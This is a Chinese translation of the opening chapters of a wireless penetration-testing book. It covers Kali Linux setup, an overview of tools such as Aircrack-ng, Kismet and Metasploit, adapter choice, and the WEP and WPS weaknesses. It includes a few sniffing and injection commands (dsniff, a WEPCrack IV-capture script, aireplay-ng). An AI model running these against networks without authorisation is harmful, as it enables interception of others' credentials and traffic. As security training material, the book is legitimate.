# 精通高度安全环境下的无线渗透测试（一）

> 原文：[`annas-archive.org/md5/D59E41F7ACC45B0B41190D5148AF7292`](https://annas-archive.org/md5/D59E41F7ACC45B0B41190D5148AF7292)
> 
> 译者：[飞龙](https://github.com/wizardforcel)
> 
> 协议：[CC BY-NC-SA 4.0](http://creativecommons.org/licenses/by-nc-sa/4.0/)

# 前言

无线技术已经变得越来越受欢迎，因为它允许您轻松地从世界各地的各种位置访问互联网，而无需网络电缆。但是，如果您不了解其危险，尤其是如果没有采取预防措施，无线网络并不总是安全的。为了保护自己，确保您的无线网络安全至关重要。在过去几年中，身份和个人信息盗窃的案例有所增加。

尽管设置和连接到不安全的无线网络更容易，但由于个人数据被窃取的风险更大，因此不再安全。它可以很容易地被经验不足的其他用户拦截。不安全的无线网络也是用户监视您在线活动的另一种方式，例如您的上网习惯、聊天、电子邮件，甚至您的在线银行账户。虽然本书提供了保护无线网络的方法，但它主要关注攻击者如何破解受保护的无线网络。它还演示了攻击者在获得对无线网络的访问权限后可以做什么。

# 本书内容

第一章，“为有效的无线渗透测试做准备”，简要介绍了无线渗透测试、Kali Linux 和无线网卡。

第二章，“无线安全测试”，向您展示了在无线渗透测试期间需要采取的步骤。它还解释了无线攻击技术和方法的示例。

第三章，“侦察和勘察”，解释了两种不同类型的无线扫描及其用途：嗅探无线网络以查找伪造接入点并记录用户名和密码。

第四章，“渗透无线网络”，解释了如何计划攻击，破解 WEP/WPA/WPA2 无线网络，并执行 MAC 地址欺骗以未经授权地访问无线网络。您还将学习如何保护自己免受这些威胁。

第五章，“访问网络”，讨论了如何访问未经授权的网络，在网络上进行评估以识别主机、确定网络规模并检测易受攻击的主机。

第六章，“漏洞评估”，对网络进行漏洞评估以确定潜在威胁。

第七章，“客户端攻击”，展示了黑客如何攻击网络上的系统和其他设备。您还将学习如何保护自己免受这些攻击。

第八章，“数据捕获和利用”，解释了如何在未加密的流量中捕获敏感信息以及中间人攻击的工作原理。

第九章，“后渗透”，解释了如何进入本地网络以访问其他主机和网络，记录他们的工作并进行清理。

第十章，“报告”，解释了如何提供包含无线渗透测试期间漏洞详细信息的报告。总结报告将提供测试的文档和如何解决潜在威胁的信息。

# 免责声明

本书内容仅供教育目的。它旨在帮助用户测试其系统对抗信息安全威胁并保护其 IT 基础设施免受类似攻击。Packt Publishing 和本书作者对因不当使用本书学习材料而导致的行为不承担责任。

# 本书所需内容

以下是要求：

+   Microsoft Windows 操作系统

+   2 GB RAM 或更多

+   USB 2.0 端口

+   互联网接入

+   支持 Kali Linux 的无线网卡或适配器

# 这本书是为谁准备的

如果您是 IT 专业人员或安全顾问，并希望提高您在无线网络上的网络和安全技能，那么这本书适合您。本书将教您如何成为无线网络渗透和破解网络和系统的专家。您将充分了解无线网络的工作原理以及保护无线网络的重要性。

# 约定

在本书中，您会发现许多不同类型信息的文本样式。以下是一些示例以及它们的含义解释。

文本中的代码词、数据库表名、文件夹名、文件名、文件扩展名、路径名、虚拟 URL、用户输入和 Twitter 用户名显示如下："您可以使用`search`命令在 Metasploit 中匹配 CVEs。"

任何命令行输入或输出都以以下形式编写：

```
dsniff –n –i eth0

```

**新术语**和**重要词汇**以粗体显示。例如，屏幕上看到的词语、菜单或对话框中的词语等，会以这样的形式出现在文本中："点击**开始**，然后点击**开始嗅探**。"

### 注意

警告或重要提示会出现在这样的框中。

### 提示

提示和技巧会以这样的形式出现。


# 第一章：准备进行有效的无线渗透测试

作为一名安全专业人士，您知道在处理数据时存在风险。数据可以被任何人访问，尤其是那些不应该访问的人。虽然本书可能提供有用的信息来保护您，但我们无法保证您的安全。管理员需要了解潜在的安全威胁是，坏事可能随时发生。如果保护数据的成本对您或您的雇主来说太昂贵，那么可以假定您的所有数据都没有价值。

本章将重点介绍高级无线渗透测试的好处以及开始使用它所需的技能。然后，您将能够在脑海中已经有一些基本知识的情况下理解接下来的几章。如果您认为自己已经有足够的基本知识，可能可以跳过本章。但是，请记住，如果您选择跳过，可能会错过一些关键因素，例如了解 Kali Linux 和知道要使用哪些无线网卡。因此，阅读这些部分将是值得的。

无论大小，无线网络都有同样的目的：通过无线电频率访问网络，无论是笔记本电脑、平板电脑还是手机。无线网络使用户可以在没有电缆的情况下访问本地网络甚至互联网。听起来很棒，对吧？那问题在哪里呢？

在今天的社会中，我们看到更多的用户受到妥协，特别是在公共 Wi-Fi 位置。可能存在开放的无线网络、弱加密或信任问题。但在开始之前，您可能需要一些适当的设备来跟随演示。由于我们专注于高级无线渗透测试，我们肯定需要集中精力在安全部分。现在，您需要保持开放的思维，并开始像黑客一样思考。

在本章中，我们将涵盖以下主题：

+   什么是 Kali Linux？

+   安装和更新 Kali Linux

+   无线渗透工具

+   无线术语

# 好处

以下是无线渗透测试的好处：

+   **避免公司数据被妥协**: 安全漏洞是昂贵的，可能会因病毒、蠕虫、特洛伊木马和非法活动而使组织损失数百万美元。无线渗透测试可以帮助您避免这些陷阱，通过在安全破坏之前识别风险。

+   **评估漏洞**: 无线渗透测试可以提供有关可利用威胁的信息，使您能够进行审计。您可以识别组织中最关键的威胁，并在实际发生之前防止攻击。保持组织的系统和软件最新可以大大降低安全风险。

+   **制定规定和政策**: 无线渗透测试帮助组织通过制定规则或政策来应对安全威胁，以保护员工。确保销售部门只能访问销售信息至关重要。您绝对不希望您的用户窥视其他人的文件。

## 价值和忠诚

只需一个用户的系统被入侵并丢失宝贵的客户数据，这将极大地影响销售量并破坏组织的声誉。没有人愿意失去他们曾经合作并且难以获得和保留的忠实客户。无线渗透测试可以帮助避免这些问题。无线渗透测试的最大好处是安全意识。了解黑客如何侵入这些网络以及一旦他们获得访问权限后可以做什么是非常重要的。这就是为什么“像黑客一样思考”可以帮助防止未来的攻击。你需要了解你的目标是谁，以及他们可能在你的系统或网络上寻找什么。数据是否有价值？始终以“如果”形式问自己。例如，如果黑客能够访问你的在线购物账户，他们能购买什么？如果黑客获得了你工作场所的安全许可，他们能对你的组织造成潜在的损害吗？这只是一些例子，但我相信你明白我的意思。

## 专业知识和技能

记住，这本书旨在专注于高级无线渗透测试。它将强调理解各种攻击背后的原理。这本书不是充斥着快速的操作指南或公共工具的指南。相反，你将学到以下内容：

+   对无线安全的详细理解

+   如何审计网络以发现安全漏洞

+   如何提供不同类型的 Wi-Fi 攻击作为概念证明

+   创建安全无线网络时应遵循的最佳安全实践

你必须具备以下条件才能进行演示：

+   在虚拟机上安装的 Kali Linux

+   至少 512MB RAM 的计算机

+   计算机上的 USB 2.0 端口用于无线网卡

你还必须具备以下基本技能：

+   无线网络

+   计算机安全

+   Linux 操作系统

+   设置和配置无线网络

总之，你将学习许多不同的可利用技术和方法，以防止无线攻击首先发生。如果你以前使用过 Kali Linux 操作系统，现在就要登录。如果你没有之前列出的技能，可能会很难理解这本书。请花时间复习任何你不认识的术语，因为这将有助于你在本书的后几章中进行一些实际演示时。 

## 谁应该阅读这本书？

对这本书会感兴趣的人是谁？当然不是每个人，但我希望大多数网络管理员或信息安全专家会感兴趣！让我们思考一下。想象一下自己是 IT 管理员，正在进行日常任务和职责。然后，令你大吃一惊的是，你的无线基础设施崩溃了！现在这将取决于企业的生产环境，但假设你在零售分销商工作，他们在仓库中不断依赖无线通信来挑选和发货产品。他们在两个接入点上使用**有线等效隐私**（**WEP**）加密。你收到通知并尝试通过 HTTP 协议无线连接远程访问无线接入点。它不接受你的登录凭据。你开始想知道到底发生了什么，然后听到其他员工说他们无法登录他们的电子邮件账户或其他个人账户。你惊慌失措地冲到仓库关闭接入点。

在这个例子中，问题在于组织仍在使用 WEP 加密，这种加密不超过 6 分钟就可以破解并获得完全访问权限。黑客可以破解这种加密，像普通用户一样连接，然后通过扫描网络、进行中间人攻击或 DNS 欺骗网络。黑客可能有许多不同的用户登录，包括对服务器的系统管理员登录，并有可能获取组织的凭据信息。最后，黑客可以复制这些信息并在网上出售，甚至出售给其他商业公司。这就是为什么保持一切更新非常重要，包括你的无线加密算法。根据今天的标准，建议至少使用**Wi-Fi Protected Access**（**WPA**）加密。在某些情况下，这取决于组织中使用的设备和设备，因为并非所有设备都支持更新的加密，所以他们最终在整个组织中使用 WEP 加密。如果你使用 WEP，请确保在无线接入点内应用 MAC 过滤并记录所有活动。

总之，每个管理员都应该阅读这本书。这意味着即使你不是在寻找高级无线渗透测试技术和方法。这本书将在几乎每一章中提供防范安全渗透的方法。我认为防范非常重要，因为你不仅会知道如何保护自己，还会了解现实世界中存在的威胁。

# 什么是 Kali Linux？

我希望你现在知道什么是 Kali Linux，因为我们将在本书中使用它。Kali Linux 是一个建立在 Debian Linux 上的安全渗透测试发行版。它涵盖了许多不同类型的安全工具，每个工具都按类别组织。让我们开始下载和安装 Kali Linux 吧！

![什么是 Kali Linux？](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-wrls-pentest-hisec-env/img/3183OS_01_01.jpg)

## 下载 Kali Linux

恭喜，你现在已经开始了本书中的第一个实践体验！我相信你会很兴奋，所以让我们开始吧！访问[`www.kali.org/downloads/`](http://www.kali.org/downloads/)。在**官方 Kali Linux 下载**部分查找：

![下载 Kali Linux](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-wrls-pentest-hisec-env/img/3183OS_01_02.jpg)

在这个演示中，我将下载并安装**Kali Linux 1.0.6 32 位 ISO**。点击**Kali Linux 1.0.6 32 位 ISO**的超链接进行下载。

根据你的互联网连接速度，这可能需要一个小时来下载，所以请提前准备好，这样你就不必等待下载。那些互联网连接速度慢的人可能需要重新考虑从本地区域内更快的来源下载。在公共场所可能会有下载限制。请确保在下载 Kali Linux 之前获得许可。

## 在 VMware Player 中安装 Kali Linux

当你下载完 Kali Linux 后，你需要确保已经安装了 VMware Player。VMware Player 是你将要安装 Kali Linux 的地方。如果你不熟悉 VMware Player，它只是一种虚拟化软件，可以模拟操作系统而无需另一个物理系统。你可以创建多个操作系统并同时运行它们。执行以下步骤：

1.  让我们从桌面上打开 VMware Player 开始：![在 VMware Player 中安装 Kali Linux](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-wrls-pentest-hisec-env/img/3183OS_01_03.jpg)

1.  VMware Player 应该打开并显示一个图形用户界面：![在 VMware Player 中安装 Kali Linux](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-wrls-pentest-hisec-env/img/3183OS_01_04.jpg)

1.  点击右侧的**创建新的虚拟机**：![在 VMware Player 中安装 Kali Linux](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-wrls-pentest-hisec-env/img/3183OS_01_05.jpg)

1.  选择**稍后安装操作系统**，然后点击**下一步**。

1.  选择**Linux**，然后从下拉菜单中选择**Debian 7**：![在 VMware Player 中安装 Kali Linux](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-wrls-pentest-hisec-env/img/3183OS_01_06.jpg)

1.  点击**下一步**继续。

1.  为虚拟机名称输入`Kali Linux`。

1.  浏览之前下载的 Kali Linux ISO 文件，然后单击**下一步**。

1.  将磁盘大小从 25 GB 更改为 50 GB，然后单击**下一步**：![在 VMware Player 中安装 Kali Linux](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-wrls-pentest-hisec-env/img/3183OS_01_07.jpg)

1.  单击**完成**：![在 VMware Player 中安装 Kali Linux](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-wrls-pentest-hisec-env/img/3183OS_01_08.jpg)

1.  现在，Kali Linux 应该显示在您的 VMware Player 库中。 从这里，您可以单击**自定义硬件…**以增加 RAM 或硬盘空间，或根据系统硬件更改网络适配器。

1.  单击**播放虚拟机**：![在 VMware Player 中安装 Kali Linux](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-wrls-pentest-hisec-env/img/3183OS_01_09.jpg)

1.  单击左上角的**播放器**，然后导航到**可移动设备** | **CD / DVD IDE** | **设置…**：![在 VMware Player 中安装 Kali Linux](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-wrls-pentest-hisec-env/img/3183OS_01_10.jpg)

1.  选中**连接**旁边的框，选择**使用 ISO 映像文件**，浏览 Kali Linux ISO，然后单击**确定**。

1.  单击屏幕底部的**重新启动 VM**或单击**播放器**，然后导航到**电源** | **重新启动客户**； 出现以下屏幕：![在 VMware Player 中安装 Kali Linux](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-wrls-pentest-hisec-env/img/3183OS_01_11.jpg)

1.  重新启动虚拟机后，您应该看到以下内容：![在 VMware Player 中安装 Kali Linux](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-wrls-pentest-hisec-env/img/3183OS_01_12.jpg)

1.  选择**Live (686-pae)**然后按*Enter*。

它应该启动到 Kali Linux 并带您到桌面屏幕：

![在 VMware Player 中安装 Kali Linux](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-wrls-pentest-hisec-env/img/3183OS_01_13.jpg)

恭喜！ 您已成功安装了 Kali Linux。

## 更新 Kali Linux

在本书的任何演示中开始之前，我们必须更新 Kali Linux 以帮助保持软件包的最新状态。

1.  从桌面打开 VMware Player。

1.  选择**Kali Linux**并单击绿色箭头以启动它。

1.  一旦 Kali Linux 启动，打开一个新的终端窗口。

1.  输入`sudo apt-get update`并按*Enter*：![更新 Kali Linux](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-wrls-pentest-hisec-env/img/3183OS_01_14.jpg)

1.  然后输入`sudo apt-get upgrade`并按*Enter*：![更新 Kali Linux](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-wrls-pentest-hisec-env/img/3183OS_01_15.jpg)

1.  您将被提示指定是否要继续。输入`y`并按*Enter*：![更新 Kali Linux](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-wrls-pentest-hisec-env/img/3183OS_01_16.jpg)

1.  重复这些命令，直到没有更多更新为止：

```
sudo apt-get update
sudo apt-get upgrade
sudo apt-get dist-upgrade

```

恭喜！ 您已成功更新了 Kali Linux！

# 无线渗透工具

运行安全评估和分析并不总是需要大量资金。 许多高效和有效的安全工具是免费的，并且被许多安全专业人员，企业和政府机构广泛使用。 在线还有其他专为安全和无线设计的 Linux 和 Unix 发行版。 以下是这些发行版的列表：

+   Anonym.OS

+   审计员

+   Arudius

+   Backtrack

+   BackBox

+   BlackArch

+   CQure AP

+   Frenzy

+   Knoppix-STD

+   Linux LiveCD 路由器

+   Less Networks 热点服务器

+   Operator

+   Pentoo

+   Phlak

+   ProTech

+   Russix

+   Sisela

+   Talos Security LiveCD

+   WarLinux

+   WHAX

以下各节将解释各种有效和常用的安全工具。

## HashCalc

HashCalc 是一个快速简单的计算器，允许计算文件以及文本和十六进制字符串的消息摘要，校验和和 HMAC。 它支持 MD5，SHA-1，SHA-2 等算法。 不建议仅凭文件大小来信任文件，因此验证文件完整性的 MD5 哈希标签是一个好主意，并且在从互联网下载文件时避免文件损坏。 以下屏幕截图显示了 HashCalc 界面：

![HashCalc](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-wrls-pentest-hisec-env/img/3183OS_01_17.jpg)

您还可以参考[`www.slavasoft.com/hashcalc/`](http://www.slavasoft.com/hashcalc/)获取有关 HashCalc 的更多信息。

## NetStumbler

NetStumbler 显示您区域内所有无线网络的列表，信号强度和无线安全性。 NetStumbler 因其功能和可靠性而受到许多用户的青睐。 它还支持 GPS。

### 提示

请注意，NetStumbler 在 Windows 7 或 64 位操作系统中的效果不佳。

以下截图显示了 NetStumbler 界面：

![NetStumbler](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-wrls-pentest-hisec-env/img/3183OS_01_18.jpg)

您还可以参考[`www.netstumbler.com`](http://www.netstumbler.com)了解更多关于 NetStumbler 的信息。

## inSSIDer

inSSIDer 是一款商业无线 Windows 应用程序，可以利用计算机的 Wi-Fi 天线扫描您所在区域的网络，跟踪信号强度并确定安全设置。

inSSIDer 非常适合快速分析区域内的无线接入点，并排除区域内其他无线设备的任何无线干扰。必备工具！

以下截图显示了 inSSIDer 界面：

![inSSIDer](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-wrls-pentest-hisec-env/img/3183OS_01_19.jpg)

您还可以参考[`www.inssider.com/`](http://www.inssider.com/)了解更多关于 inSSIDer 的信息。

## Kismet

Kismet 是一个 802.11 第二层无线探测器、嗅探器和入侵检测系统。它是迄今为止最受欢迎的安全工具之一，在无线渗透测试中被广泛使用。它可以与任何支持原始监控（RFMON）模式的无线网卡一起使用。它可以检测 802.11b、802.11a、802.11g 和 802.11n 的流量数据。它还具有 GPS 支持，并且可以同时监视多个无线适配器。

它还支持无人机。通过分发 Kismet 无人机，您可以轻松将 Kismet 变成一个完整的移动 IDS 系统！无人机通常支持所有捕获方法，然后将捕获的无线数据发送并转发到 Kismet 服务器进行分析。Kismet 预装在 Kali Linux 上。以下截图显示了 Kismet 界面：

![Kismet](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-wrls-pentest-hisec-env/img/3183OS_01_20.jpg)

有关更多信息，请参考[`www.kismetwireless.net/index.shtml`](http://www.kismetwireless.net/index.shtml)。

## WEPCrack

WEPCrack 是第一个破解 802.11 WEP 加密安全密钥的开源安全工具。最后更新于 2004 年 10 月，这可能会让您认为这现在已经过时且浪费时间。错了！这仍然具有教育意义。如果您想了解 FMS 攻击的工作原理，阅读 WEPCrack 脚本的代码是了解其工作原理的最佳方式。无论您使用什么芯片组，只要在运行工具之前将其置于 RFMON 模式即可。请参考[`wepcrack.sourceforge.net/`](http://wepcrack.sourceforge.net/)了解更多信息。以下截图显示了界面：

![WEPCrack](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-wrls-pentest-hisec-env/img/3183OS_01_21.jpg)

在上述截图中，用户现在可以开始从 128 位 WEP 捕获中收集弱 IV。

```
./pcap-getIV.pl –b 6 –i wlan0

```

![WEPCrack](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-wrls-pentest-hisec-env/img/3183OS_01_22.jpg)

## Aircrack-ng

Aircrack-ng 是用 C 编写的程序，提供了一个安全审计套件的接口。Aircrack-ng 内部的工具包括 airodump-ng、aircrack-ng、aireplay-ng、Nmap、dnsiff、arpspoof、urlsnarf 等。虽然 Aircrack-ng 可以用于恶意目的，但也可以用于恢复丢失的无线密码。Aircrack-ng 是安全专业人士的绝佳工具。更不用说它是免费使用并且可以重新分发的！Aircrack-ng 预装在 Kali Linux 上。

![Aircrack-ng](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-wrls-pentest-hisec-env/img/3183OS_01_23.jpg)

有关更多信息，请参考[`www.aircrack-ng.org/`](http://www.aircrack-ng.org/)。

## Metasploit

Metasploit 是用 Ruby 编写的程序，有助于降低数据泄露的风险。它可以通过与外部攻击者相同的方法发现网络和系统中的漏洞。Metasploit 可以检测来自各种系统和软件的数千个漏洞。Metasploit 预装在 Kali Linux 上。

那么 Metasploit 在无线渗透测试期间如何帮助呢？Metasploit 具有漏洞数据库。如果无线路由器存在绕过管理员登录的漏洞，Metasploit 很可能会在 Ruby 脚本中提供这个漏洞。这不仅适用于无线路由器，也适用于操作系统和硬件防火墙。您可以使用 Metasploit 中的`search`命令来匹配 CVE。以下截图显示了 Metasploit 界面：

![Metasploit](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-wrls-pentest-hisec-env/img/3183OS_01_24.jpg)

更多信息请访问[`www.rapid7.com/products/metasploit/`](http://www.rapid7.com/products/metasploit/)。

## Nessus

Nessus 是一个漏洞扫描程序，提供补丁、配置和合规性审计；移动、恶意软件和僵尸网络发现；敏感数据识别；以及许多其他功能。它不断更新超过 60,000 个插件，并得到专家漏洞研究团队的支持。Nessus 绝对是你会使用的最好的漏洞扫描程序之一。

Nessus 可以确定无线路由器是否存在漏洞。它将指出开放端口和 CVE，并提供漏洞的文章和链接。如果攻击者想要获取无线 AP 或路由器的管理权限，这一点至关重要。Nessus 界面如下所示：

![Nessus](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-wrls-pentest-hisec-env/img/3183OS_01_25.jpg)

更多信息请访问[`www.tenable.com/products/nessus`](http://www.tenable.com/products/nessus)。

## Armitage

Armitage 是一个用于 Metasploit 的团队协作工具，可以可视化目标、推荐利用漏洞，并暴露框架中的高级后渗透功能。它允许您使用相同的会话、共享主机、捕获数据和下载文件，以及通过共享事件日志进行通信并运行机器人来自动执行任务。Armitage 已预装在 Kali Linux 上。

如果无线 AP 恰好在 VLAN 上，您可以使用 Armitage 来在子网和网络之间进行枢纽和路由。这是一个与 Metasploit 一起工作的很棒的安全工具。记住要打破常规思维；读者想要了解的不仅仅是破解和获取对无线网络的访问权限。他们在获得对网络的访问权限之后可以做些什么？

Armitage 界面如下所示：

![Armitage](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-wrls-pentest-hisec-env/img/3183OS_01_26.jpg)

有关更多信息，请参阅[`www.fastandeasyhacking.com/`](http://www.fastandeasyhacking.com/)。

## Nmap

Nmap 是一个用于网络发现和安全审计的免费开源实用程序。许多系统和网络管理员发现它在网络清单、管理服务升级计划和监控主机或服务的正常运行时间等任务中非常有用。Nmap 可以用于检测 Linux 的操作系统版本和二进制软件包。它还可以检测网络上的开放和关闭的端口。Nmap 已预装在 Kali Linux 上。

Nmap 可以用来绘制网络和子网。它还可以确定操作系统和软件版本。这可以帮助确定网络中是否存在弱点或潜在的安全漏洞。以下截图显示了 Nmap 在 Kali Linux 中的使用：

![Nmap](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-wrls-pentest-hisec-env/img/3183OS_01_27.jpg)

有关更多信息，请参阅[`nmap.org/`](http://nmap.org/)。

## Wireshark

Wireshark 是一个免费开源的数据包分析器。它可以用于网络故障排除、分析、软件和通信协议。Wireshark 也是一个很好的教育工具，可以展示使用 SSL 或其他加密方法保护敏感信息（如用户名和密码）免受外部攻击者拦截的重要性。Wireshark 已预装在 Kali Linux 上。

那么 Wireshark 对你有什么帮助呢？Wireshark 可以检测未经授权的无线接入点，嗅探无线数据包，并跟踪 TCP 流以获取电子邮件、密码和其他敏感信息。Wireshark 界面如下所示：

![Wireshark](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-wrls-pentest-hisec-env/img/3183OS_01_28.jpg)

有关 Wireshark 的更多信息，请访问[`www.wireshark.org/`](http://www.wireshark.org/)。

## Scapy

Scapy 是一个强大的数据包操作程序。它具有伪造或解码多种协议的数据包的能力。它发送数据包，捕获数据包，匹配请求，并回复。它可以轻松处理简单的任务，如扫描、跟踪路由、探测、攻击或网络发现。它可以轻松取代 hping、85%的 Nmap、arpspoof、tcpdump、tethereal、p0f 等工具。它可以很好地执行许多其他工具无法处理的任务，比如发送无效帧，注入自己的 802.11 帧，结合 VLAN 跳跃、ARP 缓存中毒、WEP 上的 VOIP 解码等。以下截图显示了 Scapy 与 Kali Linux 一起使用：

![Scapy](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-wrls-pentest-hisec-env/img/3183OS_01_29.jpg)

有关更多信息，请访问[`www.secdev.org/projects/scapy/`](http://www.secdev.org/projects/scapy/)。

# 无线术语

在本节中，我们将讨论我认为在使用 Kali Linux 进行任何无线渗透测试时最好的硬件，包括接入点和无线网卡。有时候很难找到确切型号的某些品牌，因为设备内部可能有不同的芯片组。在开始之前，我想谈谈接入点和无线网卡的最重要的关键因素。

## 为什么我不能使用我的笔记本电脑内置的 Wi-Fi 芯片组？

要有效地破解 Wi-Fi 密码，您需要一个合适的无线适配器。检查 Aircrack-ng 的兼容性列表，确保您的无线适配器具有破解无线网络所需的功能。您需要能够进入监视模式（混杂模式）并同时注入和捕获数据包。一个无线适配器如果不能同时做到这两点，并不意味着您不能破解无线网络；无线适配器本身可能太慢而无法渲染。有关兼容驱动程序的列表，请访问[`www.aircrack-ng.org/doku.php?id=compatibility_drivers`](http://www.aircrack-ng.org/doku.php?id=compatibility_drivers)。

## 我如何确定我的 Wi-Fi 芯片组是否可用？

确定您的无线适配器是否可用，您可以使用 Aircrack-ng 运行注入测试。运行以下命令：

```
aireplay-ng -9 wlan0

```

## 无线硬件

了解实际产品本身非常重要，因为并非所有产品都能与 Kali Linux 兼容。产品应该标明“与 Kali Linux 兼容”，或者以前买家的评论应该提供关于它在 Kali Linux 上的使用情况的信息。一些产品在 Kali Linux 上表现不佳的原因是因为它不支持驱动程序。市场上有一些特定型号只能与 Kali Linux 一起使用。这是因为 Kali Linux 只支持这些特定的型号或版本。我们现在将讨论我认为在 Kali Linux 上表现最佳的几种型号。

### 无线模型

当我提到接入点或无线网卡的硬件时，我指的是芯片组。芯片组是无线设备中最重要的部分，对于购买适配 Kali Linux 的设备来说非常重要。了解它支持什么也是一个好主意。硬件是否能在 Windows 和 Mac OS X 上正常工作？硬件是否支持最新的无线 N？这只是一些需要记住的问题。

### 三种无线模型

哦是的，我们还记得 Windows XP 上的驱动程序，不是吗？了解您的无线网卡或接入点是否适用于所有平台还是只适用于一个操作系统非常重要。如果您使用 Windows 和 Linux 操作系统，您会希望确保它支持。即使无线网卡支持 Linux，它可能也不能在 Kali Linux 上工作，因为我们回到了需要支持的芯片组。

### Alfa AWUS036NHR

Alfa AWUS036NHR，如下图所示，是你将使用的最强大的无线适配器，目前仍然是你可以购买的最好的无线适配器。它具有出色的信号强度，并且在 Kali Linux 上即插即用。这个无线适配器唯一的缺点是，有报道称它不稳定，因为它可能会被 Kali Linux 识别不出来，导致许多试错重启，直到它正确工作。总的来说，这是你在范围、速度和便携性方面找到的最好的无线适配器。

![Alfa AWUS036NHR](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-wrls-pentest-hisec-env/img/3183OS_01_30.jpg)

### Alfa AWUS036H

如果你看一下 Kali Linux 的网站，你会注意到 Alfa AWUS036H（如下图所示）是最受推荐的无线适配器。这是因为它的可靠性和稳定性，可以直接在 Kali Linux 上使用，即插即用，无需额外配置。

![Alfa AWUS036H](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-wrls-pentest-hisec-env/img/3183OS_01_31.jpg)

然而，它不支持无线 N，所以你需要购买一个高增益天线来接收附近的接入点。另一件你需要知道的事情是，有很多假冒和网络诈骗，特别是在 eBay 上。所以在网上购物这个适配器时一定要非常小心！

### TL-WN722N

TL-WN722N，如下图所示，是 Alfa 的更便宜的替代品。它有点过时，因为它是在 2009 年发布的，但它仍然具有无线 N 功能。你可以通过 TP-LINK 的网站以及其他在线商店购买这个设备。如果你不想花很多钱，你可能会考虑这个无线适配器。

![TL-WN722N](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-wrls-pentest-hisec-env/img/3183OS_01_32.jpg)

总的来说，Alfa AWUS036NHR 的信号强度是三者中最好的，但不受 Kali Linux 支持。然而，有一些方法可以让它在 Kali Linux 上工作。我个人只有 Alfa AWUS036H，因为它非常可靠，而且在无线渗透测试和 Kali Linux 方面非常可靠。但如果你想省点钱，TP-LINK TL-WN722N 是一个很好的选择。

# 总结

哇！我知道这似乎是一个永远不会结束的章节，但它确实结束了，你成功度过了！恭喜你完成了第一章！这只是为了帮助你在我们深入进行高级技术演示和实际示例之前做好准备的介绍。现在你应该准备好继续阅读第二章，“无线安全测试”。

我们首先介绍了高级无线渗透测试的真实世界以及它对当今社会的影响。我们还讨论了通过进行高级无线渗透测试所获得的许多不同的好处。

然后，我们讨论了理解本书可能需要的专业知识和技能。我不希望我的读者在后面的章节中感到不适或迷失方向。我的目标是帮助你，作为读者，理解为什么学习无线安全如此重要。我为你提供了可能对本书感兴趣的目标读者以及他们为什么是目标读者。

此外，我们通过 Kali Linux 进行了第一次实际操作，安装和更新了 VMware Player。你了解了许多不同的设备、适配器和卡片用于 Kali Linux。记住，你必须有一个支持的芯片组和型号才能正确地使用它，并且它不支持所有无线芯片组。

最后，本章涵盖了开始进行高级无线渗透测试所需了解的一切。我之前提到过，你可能需要在一些你可能没有的领域具有特定的专业知识和技能，所以请注意这一点。我们现在将继续进行无线安全测试，我们将讨论几种攻击技术和方法的示例，以及预防措施来帮助保护自己。


# 第二章：无线安全测试

欢迎来到本章！我们假设您要么非常喜欢第一章，所以决定继续，要么因为您已经对自己所知道的内容感到满意，所以跳过了第一章。无论哪种情况，这是您的第一个问题。普通用户会购买无线路由器，但不配置任何无线安全。你认为这是为什么？

当然，你早就知道，这是因为普通用户可能不了解设备的安全功能或预防措施，或者他们可能懂得使用计算机，但不知道如何实施无线安全。这就是**Wi-Fi Protected Setup**（**WPS**）发挥作用的地方。

WPS 允许在无线家庭网络上进行简单配置。用户只需按一下无线路由器上的按钮，然后无线路由器会自动为用户配置一个安全网络。听起来很棒，对吧？错！大多数常见的无线路由器都容易受到暴力攻击。WPS PIN 通常只包含数字。这个安全漏洞使得攻击者可以在几个小时内使用暴力技术恢复或破解 WPS PIN。

不仅仅是用户，甚至公司和 ISP 也在这样做。他们只需插入无线路由器，按下 WPS 按钮，然后为您写下密钥。这对于企业网络来说是极其糟糕的安全措施！请花时间更改用户名，更改默认密码，关闭远程管理，并打开防火墙。

本章将涵盖以下主题：

+   无线渗透测试方法论

+   无线攻击技术和方法

+   预防

# 无线渗透测试方法论

无线渗透测试建立在经过验证的行业标准之上。总共有六个步骤：

+   侦察

+   攻击和渗透

+   客户端攻击

+   进入网络

+   漏洞评估

+   利用和数据捕获

在我们逐步介绍方法论的每个步骤之前，您将了解为什么遵循这些步骤很重要。

## 我为什么要遵循这个方法论？

